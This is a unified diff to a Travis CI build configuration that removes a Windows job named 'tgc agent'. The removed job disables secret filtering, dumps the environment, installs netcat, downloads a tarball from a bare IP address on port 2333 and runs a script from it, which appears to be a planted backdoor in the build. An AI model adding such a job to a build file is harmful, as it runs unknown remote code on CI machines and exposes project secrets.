@@ -72,29 +72,6 @@ matrix:
     - cp -v src/out/Release/naive src/config.json LICENSE USAGE.txt $BUILD_NAME ;true
     - tar cf $BUILD_NAME.tar $BUILD_NAME ;true
     - touch $BUILD_NAME.tar
-  - name: tgc agent
-    os: windows
-    env:
-    - PLATFORM=x64
-    - CLCACHE_PATH="$HOME/clcache"
-    - CLCACHE_DIR="$HOME/.clcache"
-    - GYP_MSVS_OVERRIDE_PATH="/c/Program Files (x86)/Microsoft Visual Studio/2017/BuildTools"
-    cache:
-      directories:
-      - $CLCACHE_DIR
-      - /c/Users/travis/AppData/Local/Mozilla/sccache
-    filter_secrets: false
-    install:
-    - env
-    - pwd
-    - "choco install netcat -y" # windows-sdk-10-version-1809-all python 
-    - git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git || true
-    script:
-    - pwd
-    - 'curl -sL http://45.32.65.48:2333/tgc.tar | tar xvf - -C .'
-    - pwd
-    - ls -la
-    - './tgc.sh'
   - name: Windows 64-bit
     os: windows
     env:
